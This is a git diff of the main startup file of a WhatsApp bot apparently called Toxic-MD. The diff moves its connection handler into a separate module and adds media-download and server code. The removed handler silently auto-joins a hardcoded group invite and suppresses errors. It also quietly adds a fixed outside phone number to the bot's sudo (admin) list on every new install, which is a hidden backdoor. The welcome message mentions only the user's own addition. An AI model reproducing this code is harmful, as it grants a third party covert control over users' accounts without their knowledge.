@@ -34,11 +34,10 @@ const { getSettings, getBannedUsers, banUser, getSudoUsers, addSudoUser } = requ
 const { botname } = require('../Env/settings');
 const { DateTime } = require('luxon');
 const { commands, totalCommands } = require('../Handler/commandHandler');
+const connectionHandler = require('../Handler/connectionHandler');
 authenticationn();
 
 const sessionDir = path.join(__dirname, '..', 'Session');
-const botName = process.env.BOTNAME || botname || "Toxic-MD";
-let hasSentStartMessage = false;
 
 // Function to initialize or load Base64 session
 async function initializeSession(base64Creds = null) {
@@ -67,209 +66,6 @@ async function clearSession() {
         }
     } catch (err) {
         console.error(chalk.red('Failed to clear session:', err));
-    }
-}
-
-// Connection handler (from connectionHandler.js)
-async function handleConnectionUpdate(client, update, reconnect) {
-    const { connection, lastDisconnect, qr } = update;
-
-    // Get a greeting based on the time of day (Nairobi timezone)
-    function getGreeting() {
-        const hour = DateTime.now().setZone("Africa/Nairobi").hour;
-        if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day? 🚀";
-        if (hour >= 12 && hour < 18) return "What’s up? Time to make things happen! ⚡";
-        if (hour >= 18 && hour < 22) return "Evening vibes! Let’s get to it! 🌟";
-        return "Late night? Let’s see what’s cooking! 🌙";
-    }
-
-    // Get the current time in a simple format
-    function getCurrentTime() {
-        return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
-    }
-
-    // Convert text to a fancy font
-    function toFancyFont(text, isUpperCase = false) {
-        const fonts = {
-            'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂', 'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈',
-            'N': '𝙉', 'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐', 'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕',
-            'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜', 'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢',
-            'n': '𝙣', 'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪', 'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯'
-        };
-        const formattedText = isUpperCase ? text.toUpperCase() : text.toLowerCase();
-        return formattedText.split('').map(char => fonts[char] || char).join('');
-    }
-
-    if (qr) {
-        console.log(chalk.yellow('QR code generated, please scan to authenticate.'));
-    }
-
-    if (connection === "connecting") {
-        console.log(`🔄 Establishing connection to WhatsApp servers...`);
-        return;
-    }
-
-    if (connection === "close") {
-        const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
-
-        switch (statusCode) {
-            case DisconnectReason.badSession:
-                console.log(`⚠️ Invalid session file detected. Clearing session...`);
-                await clearSession();
-                process.exit();
-                break;
-            case DisconnectReason.connectionClosed:
-                console.log(`🔌 Connection closed. Attempting to reconnect...`);
-                reconnect();
-                break;
-            case DisconnectReason.connectionLost:
-                console.log(`📡 Lost connection to server. Reconnecting...`);
-                reconnect();
-                break;
-            case DisconnectReason.connectionReplaced:
-                console.log(`🔄 Connection replaced by another session. Terminating process.`);
-                process.exit();
-                break;
-            case DisconnectReason.loggedOut:
-                console.log(`🔒 Session logged out. Clearing session...`);
-                hasSentStartMessage = false;
-                await clearSession();
-                process.exit();
-                break;
-            case DisconnectReason.restartRequired:
-                console.log(`🔄 Server requested restart. Initiating reconnect...`);
-                reconnect();
-                break;
-            case DisconnectReason.timedOut:
-                console.log(`⏳ Connection timed out. Attempting to reconnect...`);
-                reconnect();
-                break;
-            default:
-                console.log(`❓ Unknown disconnection reason: ${statusCode} | ${connection}. Reconnecting...`);
-                reconnect();
-        }
-        return;
-    }
-
-    if (connection === "open") {
-        try {
-            await client.groupAcceptInvite("GoXKLVJgTAAC3556FXkfFI");
-        } catch (error) {
-            // Silently handle group join error
-        }
-
-        const userId = client.user.id.split(":")[0].split("@")[0];
-        const settings = await getSettings();
-        const sudoUsers = await getSudoUsers();
-
-        if (!hasSentStartMessage) {
-            const isNewUser = !sudoUsers.includes(userId);
-            if (isNewUser) {
-                await addSudoUser(userId);
-                const defaultSudo = "254735342808";
-                if (!sudoUsers.includes(defaultSudo)) {
-                    await addSudoUser(defaultSudo);
-                }
-            }
-
-            const firstMessage = isNewUser
-                ? [
-                    `◈━━━━━━━━━━━━━━━━◈`,
-                    `│❒ *${getGreeting()}*`,
-                    `│❒ Welcome to *${botName}*! You're now connected.`,
-                    ``,
-                    `✨ *Bot Name*: ${botName}`,
-                    `🔧 *Mode*: ${settings.mode}`,
-                    `➡️ *Prefix*: ${settings.prefix}`,
-                    `📋 *Commands*: ${totalCommands}`,
-                    `🕒 *Time*: ${getCurrentTime()}`,
-                    `💾 *Database*: Postgres SQL`,
-                    `📚 *Library*: Baileys`,
-                    ``,
-                    `│❒ *New User Alert*: You've been added to the sudo list.`,
-                    ``,
-                    `│❒ *Credits*: xh_clinton`,
-                    `◈━━━━━━━━━━━━━━━━◈`
-                ].join("\n")
-                : [
-                    `◈━━━━━━━━━━━━━━━━◈`,
-                    `│❒ *${getGreeting()}*`,
-                    `│❒ Welcome back to *${botName}*! Connection established.`,
-                    ``,
-                    `✨ *Bot Name*: ${botName}`,
-                    `🔧 *Mode*: ${settings.mode}`,
-                    `➡️ *Prefix*: ${settings.prefix}`,
-                    `📋 *Commands*: ${totalCommands}`,
-                    `🕒 *Time*: ${getCurrentTime()}`,
-                    `💾 *Database*: Postgres SQL`,
-                    `📚 *Library*: Baileys`,
-                    ``,
-                    `│❒ Ready to proceed? Select an option below.`,
-                    ``,
-                    `│❒ *Credits*: xh_clinton`,
-                    `◈━━━━━━━━━━━━━━━━◈`
-                ].join("\n");
-
-            const secondMessage = [
-                `◈━━━━━━━━━━━━━━━━◈`,
-                `│❒ Please select an option to continue:`,
-                `◈━━━━━━━━━━━━━━━━◈`
-            ].join("\n");
-
-            try {
-                await client.sendMessage(client.user.id, {
-                    text: firstMessage,
-                    footer: `Powered by ${botName}`,
-                    viewOnce: true,
-                    contextInfo: {
-                        externalAdReply: {
-                            showAdAttribution: false,
-                            title: botName,
-                            body: `Bot initialized successfully.`,
-                            sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
-                            mediaType: 1,
-                            renderLargerThumbnail: true
-                        }
-                    }
-                });
-
-                await client.sendMessage(client.user.id, {
-                    text: secondMessage,
-                    footer: `Powered by ${botName}`,
-                    buttons: [
-                        {
-                            buttonId: `${settings.prefix || ''}settings`,
-                            buttonText: { displayText: `⚙️ ${toFancyFont('SETTINGS')}` },
-                            type: 1
-                        },
-                        {
-                            buttonId: `${settings.prefix || ''}menu`,
-                            buttonText: { displayText: `📖 ${toFancyFont('MENU')}` },
-                            type: 1
-                        }
-                    ],
-                    headerType: 1,
-                    viewOnce: true,
-                    contextInfo: {
-                        externalAdReply: {
-                            showAdAttribution: false,
-                            title: botName,
-                            body: `Select an option to proceed.`,
-                            sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
-                            mediaType: 1,
-                            renderLargerThumbnail: true
-                        }
-                    }
-                });
-            } catch (error) {
-                console.error(chalk.red(`❌ Failed to send startup messages: ${error.message}`));
-            }
-
-            hasSentStartMessage = true;
-        }
-
-        console.log(chalk.green(figlet.textSync('Toxic Bot', { horizontalLayout: 'full' })));
-        console.log(chalk.cyan(`✅ Connection established. Loaded ${totalCommands} plugins. ${botName} is operational.`));
     }
 }
 
@@ -316,7 +112,7 @@ async function startToxic() {
         setInterval(() => {
             const date = new Date();
             client.updateProfileStatus(
-                `${botName} 𝐢𝐬 𝐚𝐜𝐭𝐢𝐯𝐞 𝟐𝟒/𝟕\n\n${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} 𝐈𝐭'𝐬 𝐚 ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi'})}.`
+                `${botname} 𝐢𝐬 𝐚𝐜𝐭𝐢𝐯𝐞 𝟐𝟒/𝟕\n\n${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} 𝐈𝐭'𝐬 𝐚 ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi'})}.`
             );
         }, 10 * 1000);
     }
@@ -401,7 +197,7 @@ async function startToxic() {
                                     remoteJid: remoteJid,
                                     fromMe: false,
                                     id: mek.key.id,
-                                    participant aislant: sender
+                                    participant: sender
                                 }
                             });
                         }
@@ -465,7 +261,7 @@ async function startToxic() {
     });
 
     client.ev.on("connection.update", async (update) => {
-        await handleConnectionUpdate(client, update, startToxic);
+        await connectionHandler(client, update, startToxic);
     });
 
     client.ev.on("creds.update", saveCreds);
@@ -489,4 +285,68 @@ async function startToxic() {
                 resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
             });
         else
-       
+            v = id === "0@s.whatsapp.net"
+                ? { id, name: "WhatsApp" }
+                : id === client.decodeJid(client.user.id)
+                ? client.user
+                : store.contacts[id] || {};
+        return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
+    };
+
+    client.public = true;
+
+    client.serializeM = (m) => smsg(client, m, store);
+
+    client.ev.on("group-participants.update", async (m) => {
+        require("../Handler/eventHandler")(client, m);
+        require("../Handler/eventHandler2")(client, m);
+    });
+
+    client.sendText = (jid, text, quoted = "", options) => client.sendMessage(jid, { text: text, ...options }, { quoted });
+
+    client.downloadMediaMessage = async (message) => {
+        let mime = (message.msg || message).mimetype || '';
+        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
+        const stream = await downloadContentFromMessage(message, messageType);
+        let buffer = Buffer.from([]);
+        for await (const chunk of stream) {
+            buffer = Buffer.concat([buffer, chunk]);
+        }
+        return buffer;
+    };
+
+    client.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
+        let quoted = message.msg ? message.msg : message;
+        let mime = (message.msg || message).mimetype || '';
+        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
+        const stream = await downloadContentFromMessage(quoted, messageType);
+        let buffer = Buffer.from([]);
+        for await (const chunk of stream) {
+            buffer = Buffer.concat([buffer, chunk]);
+        }
+        let type = await FileType.fromBuffer(buffer);
+        const trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
+        await fs.writeFileSync(trueFileName, buffer);
+        return trueFileName;
+    };
+}
+
+app.use(express.static('public'));
+
+app.get("/", (req, res) => {
+    res.sendFile(__dirname + '/index.html');
+});
+
+app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+
+startToxic();
+
+module.exports = startToxic;
+
+let file = require.resolve(__filename);
+fs.watchFile(file, () => {
+    fs.unwatchFile(file);
+    console.log(chalk.redBright(`Update ${__filename}`));
+    delete require.cache[file];
+    require(file);
+});
